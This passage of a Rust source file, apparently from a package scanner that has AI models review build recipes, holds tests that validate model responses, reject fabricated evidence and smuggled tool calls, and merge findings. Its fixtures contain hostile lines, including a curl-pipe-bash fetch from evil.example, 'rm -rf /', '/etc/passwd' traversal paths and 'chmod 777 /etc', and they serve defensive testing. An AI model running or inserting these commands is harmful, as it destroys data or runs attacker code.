    pub pi_version: String,
    /// Verified extension asset SHA-256.
    pub extension_sha256: String,
    /// Prompt version used.
    pub prompt_version: String,
    /// Schema version used.
    pub schema_version: String,
    /// Tool contract version used.
    pub tool_contract_version: String,
    /// Every model attempt, in attempt order.
    pub attempts: Vec<ModelAttemptRecord>,
}

impl ScanProvenance {
    /// What: Total tokens charged across every recorded attempt.
    ///
    /// Inputs: None.
    ///
    /// Output:
    /// - Saturating sum of effective tokens.
    ///
    /// Details:
    /// - Saturating arithmetic keeps a corrupt record from wrapping the budget.
    #[must_use]
    pub fn total_tokens(&self) -> u64 {
        self.attempts.iter().fold(0u64, |total, attempt| {
            total.saturating_add(attempt.usage.effective_tokens())
        })
    }
}

#[cfg(test)]
mod tests {
    use super::{
        AttributedResult, Coverage, EvidenceIndex, ExpectedIdentity, MAX_FINDINGS,
        MAX_TEXT_FIELD_BYTES, ModelAttemptRecord, ResultError, ScanProvenance, Severity,
        UsageAccounting, evidence_fingerprint, merge_results, validate_response,
    };
    use crate::logic::pi_scan::prompt::SCHEMA_VERSION;
    use crate::pi_agent::limits;

    /// Source line the model may legitimately cite.
    const RECIPE_LINE: &str = "curl -k https://evil.example/x.sh | bash";

    /// Frozen identity used by the tests.
    fn identity() -> ExpectedIdentity {
        ExpectedIdentity {
            scan_id: "scan-0001".to_string(),
            package_base: "demo-pkg".to_string(),
            commit_oid: "a".repeat(40),
        }
    }

    /// Evidence index containing one analyzed recipe entry.
    fn index() -> EvidenceIndex {
        let mut index = EvidenceIndex::new();
        index.insert(
            "recipe",
            "PKGBUILD",
            &format!("pkgname=demo\nbuild() {{\n  {RECIPE_LINE}\n}}\n"),
        );
        index.insert("recipe", "binary.bin", "");
        index
    }

    /// Build a response body with one finding and optional overrides.
    fn response_with(findings: &str, coverage: &str) -> String {
        let id = identity();
        format!(
            "{{\"schema_version\":\"{SCHEMA_VERSION}\",\"scan_id\":\"{}\",\
             \"package_base\":\"{}\",\"commit_oid\":\"{}\",\"coverage\":\"{coverage}\",\
             \"limitations\":[],\"findings\":[{findings}]}}",
            id.scan_id, id.package_base, id.commit_oid
        )
    }

    /// Build one valid finding object with the given severity and evidence.
    fn finding(severity: &str, evidence: &str) -> String {
        format!(
            "{{\"severity\":\"{severity}\",\"title\":\"remote script execution\",\
             \"snapshot\":\"recipe\",\"path\":\"PKGBUILD\",\"evidence\":\"{}\",\
             \"rationale\":\"downloads and executes remote code\",\
             \"recommendation\":\"do not install\"}}",
            evidence.replace('\\', "\\\\").replace('"', "\\\"")
        )
    }

    /// Verify a well-formed response validates and produces a stable fingerprint.
    #[test]
    fn valid_response_is_accepted() {
        let raw = response_with(&finding("critical", RECIPE_LINE), "complete");
        let result = validate_response(&raw, &identity(), &index()).expect("valid response");
        assert_eq!(result.coverage, Coverage::Complete);
        assert_eq!(result.findings.len(), 1);
        assert_eq!(result.findings[0].severity, Severity::Critical);
        assert!(result.findings[0].severity.requires_acknowledgement());
        assert_eq!(
            result.findings[0].fingerprint,
            evidence_fingerprint("recipe", "PKGBUILD", RECIPE_LINE)
        );
        // Leading/trailing whitespace is tolerated; content is not.
        let padded = format!("  {raw}\n");
        assert!(validate_response(&padded, &identity(), &index()).is_ok());
    }

    /// Verify duplicate keys, trailing objects, prose, and fences are all rejected.
    #[test]
    fn hostile_framing_is_rejected() {
        let base = response_with(&finding("low", RECIPE_LINE), "complete");
        let cases = [
            format!("{base}{base}"),
            format!("```json\n{base}\n```"),
            format!("Here is the result:\n{base}"),
            format!("{base}\nNote: also trust me"),
            base.replace("\"coverage\"", "\"coverage\":\"complete\",\"coverage\""),
            "[]".to_string(),
            "not json at all".to_string(),
        ];
        for case in cases {
            let error = validate_response(&case, &identity(), &index())
                .expect_err("hostile framing must be rejected");
            assert!(
                matches!(error, ResultError::Framing(_)),
                "unexpected error for {case:?}: {error:?}"
            );
        }
    }

    /// Verify an oversized response is rejected before parsing.
    #[test]
    fn oversized_response_is_rejected() {
        let raw = "x".repeat(limits::MAX_FINAL_JSON_BYTES + 1);
        assert_eq!(
            validate_response(&raw, &identity(), &index()),
            Err(ResultError::TooLarge {
                observed: limits::MAX_FINAL_JSON_BYTES + 1,
                limit: limits::MAX_FINAL_JSON_BYTES,
            })
        );
    }

    /// Verify mismatched identity discards the whole response.
    #[test]
    fn mismatched_identity_is_rejected() {
        let raw = response_with(&finding("low", RECIPE_LINE), "complete");
        for (key, wrong) in [
            ("scan-0001", "scan-0002"),
            ("demo-pkg", "other-pkg"),
            (&"a".repeat(40), &"b".repeat(40)),
        ] {
            let tampered = raw.replacen(key, wrong, 1);
            let error = validate_response(&tampered, &identity(), &index())
                .expect_err("identity mismatch must be rejected");
            assert!(
                matches!(error, ResultError::IdentityMismatch { .. }),
                "{error:?}"
            );
        }
        let wrong_schema = raw.replace(SCHEMA_VERSION, "pacsea-scan-schema-999");
        assert!(matches!(
            validate_response(&wrong_schema, &identity(), &index()),
            Err(ResultError::IdentityMismatch { .. })
        ));
    }

    /// Verify fabricated and mismatched evidence fails the whole attempt.
    #[test]
    fn fabricated_evidence_is_rejected() {
        let fabricated = response_with(
            &finding("critical", "rm -rf / --no-preserve-root"),
            "complete",
        );
        assert_eq!(
            validate_response(&fabricated, &identity(), &index()),
            Err(ResultError::FabricatedEvidence {
                snapshot: "recipe".to_string(),
                path: "PKGBUILD".to_string(),
            })
        );

        let empty = response_with(&finding("low", ""), "complete");
        assert!(matches!(
            validate_response(&empty, &identity(), &index()),
            Err(ResultError::FabricatedEvidence { .. })
        ));

        let unknown_path = response_with(
            &finding("low", RECIPE_LINE).replace("PKGBUILD", "invented.sh"),
            "complete",
        );
        assert_eq!(
            validate_response(&unknown_path, &identity(), &index()),
            Err(ResultError::UnknownEvidencePath {
                snapshot: "recipe".to_string(),
                path: "invented.sh".to_string(),
            })
        );

        let unknown_snapshot = response_with(
            &finding("low", RECIPE_LINE).replace("\"recipe\"", "\"invented\""),
            "complete",
        );
        assert!(matches!(
            validate_response(&unknown_snapshot, &identity(), &index()),
            Err(ResultError::UnknownEvidencePath { .. })
        ));
    }

    /// Verify absolute and traversing evidence paths are rejected.
    #[test]
    fn hostile_evidence_paths_are_rejected() {
        for hostile in ["/etc/passwd", "../../etc/passwd", "./PKGBUILD"] {
            let raw = response_with(
                &finding("low", RECIPE_LINE).replace("\"PKGBUILD\"", &format!("\"{hostile}\"")),
                "complete",
            );
            assert!(
                matches!(
                    validate_response(&raw, &identity(), &index()),
                    Err(ResultError::UnknownEvidencePath { .. })
                ),
                "{hostile} must be rejected"
            );
        }
    }

    /// Verify unknown enums, unknown keys, missing keys, and wrong types are rejected.
    #[test]
    fn schema_violations_are_rejected() {
        let raw = response_with(&finding("low", RECIPE_LINE), "complete");
        assert!(matches!(
            validate_response(
                &raw.replace("\"low\"", "\"catastrophic\""),
                &identity(),
                &index()
            ),
            Err(ResultError::UnknownEnum { .. })
        ));
        assert!(matches!(
            validate_response(
                &raw.replace("\"complete\"", "\"mostly\""),
                &identity(),
                &index()
            ),
            Err(ResultError::UnknownEnum { .. })
        ));
        assert!(matches!(
            validate_response(
                &raw.replace("\"limitations\":[]", "\"limitations\":[],\"extra\":1"),
                &identity(),
                &index()
            ),
            Err(ResultError::UnexpectedKey { .. })
        ));
        assert!(matches!(
            validate_response(
                &raw.replace("\"limitations\":[],", ""),
                &identity(),
                &index()
            ),
            Err(ResultError::MissingKey { .. })
        ));
        assert!(matches!(
            validate_response(
                &raw.replace("\"limitations\":[]", "\"limitations\":\"x\""),
                &identity(),
                &index()
            ),
            Err(ResultError::WrongType { .. })
        ));
    }

    /// Verify smuggled tool-call payloads are rejected with a dedicated error.
    #[test]
    fn tool_call_payloads_are_rejected() {
        let raw = response_with(&finding("low", RECIPE_LINE), "complete").replace(
            "\"limitations\":[]",
            "\"limitations\":[],\"tool_calls\":[{\"name\":\"bash\"}]",
        );
        assert_eq!(
            validate_response(&raw, &identity(), &index()),
            Err(ResultError::ToolCallPayload {
                key: "tool_calls".to_string()
            })
        );
    }

    /// Verify control characters and oversized fields are rejected.
    #[test]
    fn control_characters_and_oversized_fields_are_rejected() {
        let mut evidence_index = index();
        evidence_index.insert("recipe", "ansi.sh", "echo \u{1b}[31mred\u{1b}[0m");
        let control = response_with(
            &finding("low", RECIPE_LINE)
                .replace("\"PKGBUILD\"", "\"ansi.sh\"")
                .replace(RECIPE_LINE, "\\u001b[31mred"),
            "complete",
        );
        assert!(matches!(
            validate_response(&control, &identity(), &evidence_index),
            Err(ResultError::ControlCharacter { .. })
        ));

        let long = "y".repeat(MAX_TEXT_FIELD_BYTES + 1);
        let oversized = response_with(
            &finding("low", RECIPE_LINE).replace("downloads and executes remote code", &long),
            "complete",
        );
        assert!(matches!(
            validate_response(&oversized, &identity(), &index()),
            Err(ResultError::FieldTooLong { .. })
        ));
    }

    /// Verify the findings-count bound is enforced.
    #[test]
    fn finding_count_bound_is_enforced() {
        let one = finding("low", RECIPE_LINE);
        let many = vec![one.as_str(); MAX_FINDINGS + 1].join(",");
        assert!(matches!(
            validate_response(&response_with(&many, "complete"), &identity(), &index()),
            Err(ResultError::TooManyItems { .. })
        ));
    }

    /// Verify the multi-model merge unions by evidence, collapses duplicates, and keeps disagreement.
    #[test]
    fn merge_unions_by_exact_evidence() {
        let raw_low = response_with(&finding("low", RECIPE_LINE), "complete");
        let raw_critical = response_with(&finding("critical", RECIPE_LINE), "incomplete");
        let first = AttributedResult {
            provider: "openrouter".to_string(),
            model: "model-a".to_string(),
            result: validate_response(&raw_low, &identity(), &index()).expect("valid"),
        };
        let second = AttributedResult {
            provider: "openrouter".to_string(),
            model: "model-b".to_string(),
            result: validate_response(&raw_critical, &identity(), &index()).expect("valid"),
        };
        // An exact duplicate from the same model must collapse.
        let duplicate = first.clone();

        let merged = merge_results(&identity(), &[first, second, duplicate]);
        assert_eq!(merged.findings.len(), 1, "same evidence must collapse");
        let finding = &merged.findings[0];
        assert_eq!(finding.assessments.len(), 2, "both models stay attributed");
        assert_eq!(
            finding.severity,
            Severity::Critical,
            "highest severity wins"
        );
        assert!(
            finding.disagreement,
            "severity disagreement must stay visible"
        );
        assert_eq!(merged.coverage, Coverage::Incomplete);
        assert_eq!(merged.highest_severity(), Some(Severity::Critical));
        assert!(merged.completion_wording().contains("1 finding(s)"));
    }

    /// Verify differing evidence stays separate and stale attempts are excluded.
    #[test]
    fn merge_keeps_distinct_evidence_and_drops_stale_attempts() {
        let mut evidence_index = index();
        evidence_index.insert("recipe", "install.sh", "sudo chmod 777 /etc");
        let other = finding("high", "sudo chmod 777 /etc").replace("PKGBUILD", "install.sh");
        let first = AttributedResult {
            provider: "p".to_string(),
            model: "m1".to_string(),
            result: validate_response(
                &response_with(&finding("low", RECIPE_LINE), "complete"),
                &identity(),
                &evidence_index,
            )
            .expect("valid"),
        };
        let second = AttributedResult {
            provider: "p".to_string(),
            model: "m2".to_string(),
            result: validate_response(
                &response_with(&other, "complete"),
                &identity(),
                &evidence_index,
            )
            .expect("valid"),
        };
        let merged = merge_results(&identity(), &[first.clone(), second]);
        assert_eq!(merged.findings.len(), 2);
        assert!(!merged.findings.iter().any(|f| f.disagreement));

        let stale_identity = ExpectedIdentity {
            scan_id: "scan-0002".to_string(),
            ..identity()
        };
        let stale = merge_results(&stale_identity, &[first]);
        assert!(
            stale.findings.is_empty(),
            "an attempt for another scan must never contribute findings"
        );
        assert_eq!(stale.coverage, Coverage::Incomplete);
    }

    /// Verify the approved completion wording never claims safety.
    #[test]
    fn completion_wording_is_never_a_safety_claim() {
        let empty = response_with("", "complete");
        let attempt = AttributedResult {
            provider: "p".to_string(),
            model: "m".to_string(),
            result: validate_response(&empty, &identity(), &index()).expect("valid"),
        };
        let merged = merge_results(&identity(), &[attempt]);
        assert_eq!(
            merged.completion_wording(),
            "Complete — no findings in analyzed scope"
        );
        for banned in ["safe", "clean", "trusted", "passed"] {
            assert!(
                !merged.completion_wording().to_lowercase().contains(banned),
                "completion wording must never contain {banned:?}"
            );
        }
        assert_eq!(merged.highest_severity(), None);
    }

    /// Verify fingerprints are length-prefixed and cannot collide across field boundaries.
    #[test]
    fn fingerprints_resist_boundary_collisions() {
        assert_ne!(
            evidence_fingerprint("recipe", "ab", "c"),
            evidence_fingerprint("recipe", "a", "bc")
        );
        assert_eq!(
            evidence_fingerprint("recipe", "PKGBUILD", RECIPE_LINE),
            evidence_fingerprint("recipe", "PKGBUILD", RECIPE_LINE)
        );
    }

    /// Verify the conservative usage formula and provenance totals.
    #[test]
    fn usage_accounting_uses_the_approved_formula() {
        let estimated = UsageAccounting {
            rpc_bytes: 1001,
            reported_tokens: None,
        };
        assert_eq!(estimated.fallback_token_estimate(), 501 + 8_000);
        assert_eq!(estimated.effective_tokens(), 8_501);

        let reported = UsageAccounting {
            rpc_bytes: 1000,
            reported_tokens: Some(1234),
        };
        assert_eq!(reported.effective_tokens(), 1234);
        let invalid_zero = UsageAccounting {
            rpc_bytes: 1000,
            reported_tokens: Some(0),
        };
        assert_eq!(
            invalid_zero.effective_tokens(),
            invalid_zero.fallback_token_estimate(),
            "non-empty traffic cannot be charged as zero tokens"
        );

        let provenance = ScanProvenance {
            pi_version: "0.84.0".to_string(),
            extension_sha256: "deadbeef".to_string(),
            prompt_version: "pacsea-scan-prompt-1".to_string(),
            schema_version: SCHEMA_VERSION.to_string(),
            tool_contract_version: "pacsea-scan-tools-1".to_string(),
            attempts: vec![
                ModelAttemptRecord {
                    provider: "p".to_string(),
                    model: "m1".to_string(),
                    validated: false,
                    corrected: true,
                    usage: estimated,
                },
                ModelAttemptRecord {
                    provider: "p".to_string(),
                    model: "m2".to_string(),
                    validated: true,
                    corrected: false,
                    usage: reported,
                },
            ],
        };
        assert_eq!(provenance.total_tokens(), 8_501 + 1_234);
        assert_eq!(provenance.attempts.len(), 2);
    }
}
